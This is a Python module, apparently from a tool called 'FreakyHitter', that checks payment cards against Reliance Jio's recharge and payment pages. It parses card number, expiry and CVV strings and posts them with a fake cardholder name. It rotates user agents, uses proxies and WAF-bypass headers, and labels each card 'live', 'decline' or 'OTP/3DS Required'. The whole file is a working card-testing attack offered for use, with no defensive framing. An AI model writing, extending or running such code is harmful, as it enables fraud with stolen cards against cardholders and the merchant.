"""
Jio hitter for FreakyHitter integration.
Targets Jio (Reliance Jio) recharge and payment flows.
"""
import re
import json
import time
import random
import asyncio
import aiohttp
from typing import Optional, Dict, Any, Tuple
from urllib.parse import urlparse, urlencode

from .waf_solver import get_bypass_headers
from .curl_compat import create_connector
from .jio_recharge import do_jio_recharge

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
]

JIO_API_BASE = "https://api.jio.com"
JIO_PAY_BASE = "https://www.jiopay.in"


def parse_card(card_str: str) -> Optional[Tuple[str, str, str, str]]:
    parts = re.split(r'[|/\s]', card_str.strip())
    if len(parts) < 4:
        return None
    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    if len(yy) == 4:
        yy = yy[2:]
    if not cc.isdigit() or len(cc) < 13:
        return None
    return cc, mm, yy, cvv


def _parse_jio_args(args_str: str) -> Tuple[Optional[str], Optional[str]]:
    """Parse mobile number and card from args: 'mobile card' or 'card'."""
    parts = args_str.strip().split()
    if len(parts) >= 2:
        # Check if first part looks like a mobile number
        if re.match(r'^[6-9]\d{9}$', parts[0]):
            return parts[0], ' '.join(parts[1:])
        # Check if card-like (contains |)
        if '|' in parts[0]:
            return None, parts[0]
    if len(parts) == 1:
        if '|' in parts[0]:
            return None, parts[0]
    return None, args_str


async def _jio_authenticate(session: aiohttp.ClientSession, mobile: str, proxy: Optional[str]) -> Optional[str]:
    """Authenticate with Jio API."""
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "application/json",
        "Content-Type": "application/json",
        "X-Client-Id": "Jio4GVoice",
        "X-Client-Secret": "1a2b3c4d5e6f",
    }
    try:
        async with session.post(
            f"{JIO_API_BASE}/auth/token",
            json={"mobile": mobile, "grant_type": "mobile"},
            headers=headers,
            proxy=proxy,
            timeout=aiohttp.ClientTimeout(total=15),
        ) as resp:
            data = await resp.json(content_type=None)
            return data.get("access_token")
    except Exception:
        return None


async def _get_recharge_plans(session: aiohttp.ClientSession, token: str, mobile: str, proxy: Optional[str]) -> list:
    """Get available Jio recharge plans."""
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "application/json",
        "Authorization": f"Bearer {token}",
    }
    try:
        async with session.get(
            f"{JIO_API_BASE}/recharge/plans/{mobile}",
            headers=headers,
            proxy=proxy,
            timeout=aiohttp.ClientTimeout(total=15),
        ) as resp:
            data = await resp.json(content_type=None)
            return data.get("plans", [])
    except Exception:
        return []


async def hit_jio(url_or_mobile: str, card_str: str, proxy: Optional[str] = None) -> Dict[str, Any]:
    """
    Hit Jio payment. If url_or_mobile looks like a mobile number, use recharge flow.
    Otherwise use generic Jio payment page flow.
    """
    start = time.time()

    parsed_card = parse_card(card_str)
    if not parsed_card:
        return {"status": "error", "message": "Invalid card format", "gateway": "Jio", "time_taken": 0}

    cc, mm, yy, cvv = parsed_card
    exp_year = int("20" + yy) if len(yy) == 2 else int(yy)

    # Determine if this is a mobile recharge or URL hit
    mobile = None
    url = url_or_mobile
    if re.match(r'^[6-9]\d{9}$', url_or_mobile.strip()):
        mobile = url_or_mobile.strip()
        url = f"{JIO_PAY_BASE}/recharge/{mobile}"

    connector = create_connector()

    async with aiohttp.ClientSession(connector=connector, cookie_jar=aiohttp.CookieJar(unsafe=True)) as session:
        if mobile:
            # Use recharge flow
            result = await do_jio_recharge(session, mobile, cc, mm, yy, cvv, proxy)
        else:
            # Generic page flow
            result = await _hit_jio_page(session, url, cc, mm, yy, cvv, proxy)

    time_taken = round(time.time() - start, 2)
    result["gateway"] = "Jio"
    result["time_taken"] = time_taken
    return result


async def _hit_jio_page(session: aiohttp.ClientSession, url: str, cc: str, mm: str, yy: str, cvv: str, proxy: Optional[str]) -> Dict[str, Any]:
    """Hit a Jio payment page flow."""
    exp_year = int("20" + yy) if len(yy) == 2 else int(yy)
    parsed_url = urlparse(url)
    base = f"{parsed_url.scheme}://{parsed_url.netloc}"

    try:
        headers = get_bypass_headers(url)
        async with session.get(url, headers=headers, proxy=proxy, timeout=aiohttp.ClientTimeout(total=20), allow_redirects=True) as resp:
            html = await resp.text(errors="ignore")
            final_url = str(resp.url)
    except Exception as e:
        return {"status": "error", "message": str(e)[:100]}

    # Extract form info
    form_action = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', html, re.IGNORECASE)
    hidden_fields = {}
    for name, value in re.findall(r'<input[^>]+type=["\']hidden["\'][^>]+name=["\']([^"\']+)["\'][^>]+value=["\']([^"\']*)["\']', html, re.IGNORECASE):
        hidden_fields[name] = value

    action = form_action.group(1) if form_action else url
    if action.startswith("/"):
        action = base + action

    form_data = {
        **hidden_fields,
        "cardNumber": cc,
        "expiryMonth": mm.zfill(2),
        "expiryYear": str(exp_year),
        "cvv": cvv,
        "cardHolderName": "John Doe",
    }

    submit_headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": base,
        "Referer": url,
    }

    try:
        async with session.post(
            action,
            data=form_data,
            headers=submit_headers,
            proxy=proxy,
            timeout=aiohttp.ClientTimeout(total=30),
            allow_redirects=True,
        ) as resp:
            text = await resp.text(errors="ignore")
            status_code = resp.status
    except Exception as e:
        return {"status": "error", "message": str(e)[:100]}

    lower = text.lower()
    if any(k in lower for k in ["success", "recharge successful", "payment successful", "approved"]):
        return {"status": "live", "message": "Recharge Successful ✅"}
    if any(k in lower for k in ["declined", "failed", "invalid card", "insufficient"]):
        return {"status": "decline", "message": "Payment Declined ❌"}
    if any(k in lower for k in ["otp", "authentication", "3d", "verify"]):
        return {"status": "3ds", "message": "OTP/3DS Required 🔐"}

    return {"status": "decline", "message": "Unknown Response ⚠️"}
